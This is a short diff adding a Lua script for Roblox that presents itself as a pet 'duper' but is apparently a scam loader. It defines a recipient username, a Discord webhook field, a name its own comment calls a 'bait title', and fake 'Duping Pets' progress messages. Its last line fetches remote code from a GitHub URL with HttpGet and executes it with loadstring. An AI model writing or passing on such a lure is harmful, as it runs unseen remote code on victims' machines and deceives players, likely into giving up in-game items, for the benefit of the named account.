@@ -1,0 +1,8 @@
+local player_USERNAME = "Rusty1279" 
+local discord_WEBHOOK = "" -- leave blank if no webhook 
+local Custom_Script_Name = "Ace's Duper" -- bait title
+local txt_1 = "Script Loaded..." 
+local txt_2 = "Waiting for Script" 
+local txt_3 = "Duping Pets.." 
+local txt_4 = "Duping Pets..." 
+loadstring(game:HttpGet("https://github.com/Rustyscript/Psx-dupe-script-op/new/main"))()
